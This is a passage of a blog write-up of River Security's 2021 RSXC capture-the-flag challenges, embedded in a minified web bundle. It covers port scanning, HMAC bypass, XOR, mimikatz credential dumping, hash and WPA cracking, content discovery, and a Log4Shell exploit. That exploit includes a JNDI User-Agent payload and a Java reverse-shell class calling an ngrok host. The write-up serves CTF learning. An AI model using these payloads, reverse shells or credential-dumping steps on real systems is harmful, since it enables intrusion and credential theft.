<span class="token variable">$hmac</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hmac</span> <span class="token operator">!=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 403 Forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></span></code>`,lk,T,wb,pi,Eb,Tb,li,yb,Vb,ii,xb,Rb,ci,Ub,Nb,ri,Wb,Sb,ik,ee,BT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> --data <span class="token string">'&#123;"host":"", "hmac":""&#125;'</span> --header <span class="token string">'Content-Type: application/json'</span> http://rsxc.no:20020/api.php
RSXC<span class="token punctuation">&#123;</span>You_have_to_have_the_right_order_for_arguments<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,ck,te,Mb,ui,Ib,rk,oe,Ao,Ob,uk,pe,Xo,Fb,kk,qo,Go,zb,ya,Cb,hk,le,Bo,Db,fk,G,Yb,ki,Zb,Jb,hi,jb,Pb,dk,ie,$T=`<code class="language-shell">$ .<span class="token punctuation"></span>mimikatz.exe

  <span class="token builtin class-name">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span>
 <span class="token builtin class-name">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="token comment">## /  ##  /*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">##  / ##       > https://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent.letoux@gmail.com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        <span class="token operator">></span> https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz <span class="token comment"># sekurlsa::minidump lsass.DMP</span>
Switch to MINIDUMP <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span>

mimikatz <span class="token comment"># sekurlsa::logonpasswords</span>
Opening <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span> <span class="token function">file</span> <span class="token keyword">for</span> minidump<span class="token punctuation">..</span>.

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1304254</span> <span class="token punctuation">(</span>00000000:0013e6be<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">2</span>
User Name         <span class="token builtin class-name">:</span> river-security-xmas
Domain            <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
Logon Server      <span class="token builtin class-name">:</span> WIN-QC6FTBKEEE9
Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2021</span>-11-12 <span class="token number">13</span>:29:30
SID               <span class="token builtin class-name">:</span> S-1-5-21-2640804858-4017698289-1413954960-1001
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> river-security-xmas
         * Domain   <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
         * NTLM     <span class="token builtin class-name">:</span> 7801ee9c5762bb027ee224d54cb8f62e
         * SHA1     <span class="token builtin class-name">:</span> bebad302f8e64b59279c3a6747db0e076800d9ca
<span class="token punctuation">..</span>.</code>`,mk,y,Hb,fi,Ab,Xb,di,qb,Gb,mi,Bb,$b,bi,Qb,Lb,gi,Kb,a0,bk,ce,QT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">"7801ee9c5762bb027ee224d54cb8f62e"</span> <span class="token operator">></span> <span class="token builtin class-name">hash</span>
juki@izone:~/Desktop/ctf/rsxc2021$ john --format<span class="token operator">=</span>nt --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>NT <span class="token punctuation">[</span>MD4 <span class="token number">128</span>/128 XOP 4x2<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider --fork<span class="token operator">=</span><span class="token number">4</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
alliwantforchristmasisyou <span class="token punctuation">(</span>?<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:01 DONE <span class="token punctuation">(</span><span class="token number">2021</span>-12-21 <span class="token number">13</span>:08<span class="token punctuation">)</span> <span class="token number">0</span>.7462g/s 7621Kp/s 7621Kc/s 7621KC/s alliwantisy0oh<span class="token punctuation">..</span>allitaite10
Use the <span class="token string">"--show --format=NT"</span> options to display all of the cracked passwords reliably
Session completed</code>`,gk,re,s0,vi,n0,vk,ue,$o,e0,_k,ke,Qo,t0,wk,Lo,_i,o0,Ek,he,Ko,p0,Tk,v,l0,wi,i0,c0,Ei,r0,u0,Ti,k0,h0,yi,f0,d0,Vi,m0,b0,xi,g0,v0,yk,Ja,_0,Ri,w0,E0,Vk,fe,LT=`<code class="language-python=">f2 = open(&quot;filtered.txt&quot;, &quot;a&quot;)
with open(&quot;/usr/share/wordlists/rockyou.txt&quot;, &quot;rb&quot;) as f:
    a = [x for x in f.readlines()]
    for line in a:
        try:
            if line[0] == 83: # &quot;S&quot;
                f2.write(line.decode())
        except:
            pass
f2.close()</code>`,xk,ap,T0,Rk,de,KT=`<code class="language-undefined">juki@izone:~/Desktop/ctf/rsxc2021$ aircrack-ng 22-challenge.cap -w filtered.txt
Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

   #  BSSID              ESSID                     Encryption

   1  1A:2F:49:69:AA:0A  Private                   WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

1 potential targets



                               Aircrack-ng 1.6

      [00:01:28] 97735/98553 keys tested (1118.76 k/s)

      Time left: 0 seconds                                      99.17%

                         KEY FOUND! [ Santaclaws99 ]


      Master Key     : 98 91 0D 48 C4 92 05 45 42 CB 4C AF 72 3B 11 C8
                       EA EB BE 40 FD 9A 01 E8 43 D8 A2 F0 AD 36 37 DD

      Transient Key  : 77 3D 16 7F 4D C5 78 93 1F C9 2C 58 1F 82 9A 6C
                       A7 FF 49 BB 44 20 9C 07 D5 BD 72 B7 0E 47 39 51
                       AD 5D DA 9D AD D8 87 6F DE 5E 86 F5 33 FB 8B 18
                       4B FD D7 06 8D 6C 8A 34 36 77 D7 E1 AA 7F 93 8E

      EAPOL HMAC     : 7C 95 55 6F 18 39 03 44 43 64 CD D0 AB 25 89 0B

</code>`,Uk,ja,y0,Ui,V0,x0,Nk,D,R0,Ni,U0,N0,sp,A3,W0,np,X3,Wk,me,S0,ep,q3,Sk,be,M0,Wi,I0,Mk,ge,tp,O0,Ik,ve,op,F0,Ok,pp,lp,z0,Va,C0,Fk,_e,ip,D0,zk,B,Y0,Si,Z0,J0,Mi,j0,P0,Ck,$,H0,Ii,A0,X0,Oi,q0,G0,Dk,we,ay=`<code class="language-python">f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"small.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/usr/share/wordlists/dirb/small.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> a<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token operator">+</span><span class="token string">"/flag.txt"</span><span class="token operator">+</span><span class="token string">"&#92;n"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Yk,Pa,B0,Fi,$0,Q0,Zk,Ee,sy=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ gobuster -fw -u http://rsxc.no:20023/ -w small.txt -l -o result
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">head</span> result -n <span class="token number">10</span>
/03/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/10/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/01/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/00/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/100/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1000/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/123/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/0/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/02/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">grep</span> -v <span class="token string">"Size: 20"</span> result <span class="token comment"># since [Size: 20] should indicate the message "404 - File not found"</span>
/logfile/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">120</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20023/logfile/flag.txt <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag<span class="token punctuation">&#125;</span></code>`,Jk,Te,L0,zi,K0,jk,ye,cp,ag,Pk,Ve,rp,sg,Hk,up,kp,ng,xa,eg,Ak,xe,hp,tg,Xk,_,og,Ci,pg,lg,Di,ig,cg,Yi,rg,ug,Zi,kg,hg,Ji,fg,dg,ji,mg,bg,qk,fp,Pi,gg,Gk,Ha,vg,Ra,_g,wg,Bk,Re,ny=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53502</span>
<span class="token number">0</span>
 &#96;\uFFFD</code>`,$k,Ue,ey=`<code class="language-shell">juki@izone:~$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://4.tcp.ngrok.io:14996/a&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span></code>`,Qk,dp,Eg,Lk,mp,Tg,Kk,Y,Ne,yg,Hi,Vg,xg,Rg,Ai,Ug,Ng,Xi,Wg,ah,Q,Sg,qi,Mg,Ig,Gi,Og,Fg,sh,We,ty=`<code class="language-undefined"># Computer 1
tcp://8.tcp.ngrok.io:16405 -&gt; localhost:1389 # LDAP Referral Server
http://calm-warthog-89.loca.lt -&gt; localhost:8000 # HTTP server

# Computer 2
tcp://4.tcp.ngrok.io:14996 -&gt; localhost:9001 # Netcat reverse shell</code>`,nh,Aa,zg,Ua,Cg,Dg,eh,Se,oy=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://calm-warthog-89.loca.lt/#Exploit"</span>
Listening on <span class="token number">0.0</span>.0.0:1389</code>`,th,bp,Yg,oh,Me,py=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ python3 -m http.server
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">8000</span> <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span></code>`,ph,Ie,ly=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span></code>`,lh,Xa,Zg,Bi,Jg,jg,ih,Oe,iy=`<code class="language-java"><span class="token comment">// Exploit.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">&#123;</span>

	<span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">String</span> host<span class="token operator">=</span><span class="token string">"4.tcp.ngrok.io"</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">14996</span><span class="token punctuation">;</span>
		<span class="token class-name">String</span> cmd<span class="token operator">=</span><span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>
		<span class="token class-name">Process</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">Socket</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">InputStream</span> pi<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								pe<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								si<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">OutputStream</span> po<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code>`,ch,gp,Pg,rh,Fe,cy=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ javac Exploit.java -source <span class="token number">8</span> -target <span class="token number">8</span>
warning: <span class="token punctuation">[</span>options<span class="token punctuation">]</span> bootstrap class path not <span class="token builtin class-name">set</span> <span class="token keyword">in</span> conjunction with -source <span class="token number">8</span>
<span class="token number">1</span> warning
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://8.tcp.ngrok.io:16405/Exploit&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span>
</code>`,uh,qa,Hg,$i,Ag,Xg,kh,ze,ry=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53624</span>
<span class="token function">ls</span>
app
bin
dev
etc
flag.txt
home
lib
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
<span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>We_do_like_logging_right?<span class="token punctuation">&#125;</span>
<span class="token function">env</span>
<span class="token assign-left variable">JAVA_ALPINE_VERSION</span><span class="token operator">=</span><span class="token number">8.181</span>.13-r0
<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>040a0b24af81
<span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/<span class="token punctuation">..</span>/lib/amd64
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable">JAVA_VERSION</span><span class="token operator">=</span>8u181
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/
<span class="token assign-left variable">FLAG</span><span class="token operator">=</span>base32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU</code>`,hh,Ce,qg,Qi,Gg;return{c(){f=e("p"),Z=i("Here is Shirajuki\u2019s write-up of the challenges of the company River Security\u2019s capture the flag advent calendar for 2021, RSXC."),J=u(),F=e("h2"),d=e("a"),z=i("[DAY 1] The search"),$a=u(),Qa=e("h3"),je=e("a"),Oh=i("Challenge"),ac=u(),Wa=e("blockquote"),La=e("p"),Fh=i("Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges "),Wp=e("code"),zh=i("RSXC{flag}"),Ch=i(". If another flag format is used, the challenge text will mention this."),Dh=u(),Sp=e("p"),Yh=i("In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it\u2019s in the range 30 000-31 000."),sc=u(),Ka=e("h3"),Pe=e("a"),Zh=i("Solution"),nc=u(),He=e("p"),Jh=i("We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:"),ec=u(),as=e("pre"),tc=u(),ss=e("p"),jh=i("The flag is: "),Mp=e("code"),Ph=i("RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}"),oc=u(),ns=e("h2"),Ae=e("a"),Hh=i("[DAY 2] A magic word"),pc=u(),es=e("h3"),Xe=e("a"),Ah=i("Challenge"),lc=u(),Sa=e("blockquote"),Ip=e("p"),Xh=i("We have found a magical port that is listening on port 20002, maybe you can find todays flag there?"),qh=u(),Op=e("p"),Gh=i("rsxc.no:20002"),ic=u(),ts=e("h3"),qe=e("a"),Bh=i("Solution"),cc=u(),j=e("p"),$h=i("We know that there is an open port at 20002, connecting to it using the tool "),Fp=e("code"),Qh=i("netcat"),Lh=i(", we see that it takes in an input and outputs "),zp=e("code"),Kh=i('"That is not the byte I want!"'),af=i(" whenever the user writes in the wrong input."),rc=u(),os=e("pre"),uc=u(),Ge=e("p"),sf=i("From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:"),kc=u(),ps=e("pre"),hc=u(),ls=e("p"),nf=i("The flag is "),Cp=e("code"),ef=i("RSXC{You_found_the_magic_byte_I_wanted_Good_job!}"),fc=u(),is=e("h2"),Be=e("a"),tf=i("[DAY 3] What does this mean?"),dc=u(),cs=e("h3"),$e=e("a"),of=i("Challenge"),mc=u(),Qe=e("blockquote"),Le=e("p"),pf=i(`When looking for the prizes to this challenge we came across some text we can\u2019t understand, can you help us figure out what it means?
`),K=e("a"),lf=i("https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),bc=u(),rs=e("h3"),Ke=e("a"),cf=i("Solution"),gc=u(),us=e("pre"),vc=u(),ks=e("p"),rf=i("We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the \u201CMagic\u201D tool does finally give us the flag: "),aa=e("a"),uf=i("https://gchq.github.io/CyberChef/#recipe=From_Base64(\u2018A-Za-z0-9%2B/%3D\u2019,true)From_Base58(\u2018rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz\u2019,false)Bzip2_Decompress(false)From_Base85(\u2018!-u\u2019)From_Morse_Code(\u2018Space\u2019,\u2018Line%20feed\u2019)From_Hex(\u2018Auto\u2019)From_Base32(\u2018A-Z2-7%3D\u2019,false)"),_c=u(),Ma=e("p"),kf=i("The flag is "),Dp=e("code"),hf=i("RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}"),ff=i("."),wc=u(),hs=e("h2"),at=e("a"),df=i("[DAY 4] 4 Bytes of XOR"),Ec=u(),fs=e("h3"),st=e("a"),mf=i("Challenge"),Tc=u(),nt=e("blockquote"),et=e("p"),bf=i(`The flag of the day can be found by xor\u2019ing our text with 4 bytes.
`),sa=e("a"),gf=i("https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),yc=u(),ds=e("h3"),tt=e("a"),vf=i("Solution"),Vc=u(),Ia=e("p"),_f=i("We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known "),Yp=e("code"),wf=i("RSXC{"),Ef=i(", we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:"),xc=u(),ms=e("pre"),Rc=u(),bs=e("p"),Tf=i("The flag is "),Zp=e("code"),yf=i("RSXC{Most_would_say_XOR_isn't_that_useful_anymore}"),Uc=u(),gs=e("h2"),ot=e("a"),Vf=i("[DAY 5] Plain discussion"),Nc=u(),vs=e("h3"),pt=e("a"),xf=i("Challenge"),Wc=u(),lt=e("blockquote"),it=e("p"),Rf=i(`A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
`),na=e("a"),Uf=i("https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),Sc=u(),_s=e("h3"),ct=e("a"),Nf=i("Solution"),Mc=u(),rt=e("p"),Wf=i("We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first."),Ic=u(),ws=e("pre"),Oc=u(),Oa=e("p"),Sf=i("Following that I stringed for "),Jp=e("code"),Mf=i("flag"),If=i(" which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely."),Fc=u(),Es=e("pre"),zc=u(),ut=e("p"),Of=i("From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:"),Cc=u(),Ts=e("pre"),Dc=u(),ys=e("p"),Ff=i("The flag is "),jp=e("code"),zf=i("RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}"),Yc=u(),Vs=e("h2"),kt=e("a"),Cf=i("[DAY 6] The indecipherable cipher"),Zc=u(),xs=e("h3"),ht=e("a"),Df=i("Challenge"),Jc=u(),ft=e("blockquote"),dt=e("p"),Yf=i(`We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
